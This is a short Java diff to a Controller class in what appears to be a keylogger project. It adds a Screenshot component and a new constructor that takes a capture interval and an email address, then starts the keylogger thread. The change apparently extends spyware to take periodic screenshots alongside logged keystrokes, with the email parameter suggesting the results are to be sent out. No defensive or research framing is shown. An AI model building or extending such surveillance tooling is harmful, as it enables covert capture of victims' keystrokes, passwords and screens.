@@ -7,6 +7,7 @@ public class Controller {
 
     private KeyLogger keyLogger;
     private Display display;
+    private Screenshot photographer;
 
     public KeyLogger getKeyLogger() {
         return keyLogger;
@@ -29,6 +30,18 @@ public class Controller {
         System.out.println(this);
         keyLogger = new KeyLogger();
         keyLogger.setCon(this);
+        Thread t = new Thread(keyLogger);
+        t.start();
+
+    }
+
+    public Controller(String interval, String email){
+
+        System.out.println(this);
+        keyLogger = new KeyLogger();
+        keyLogger.setCon(this);
+        photographer = new Screenshot(interval);
+
         Thread t = new Thread(keyLogger);
         t.start();
 
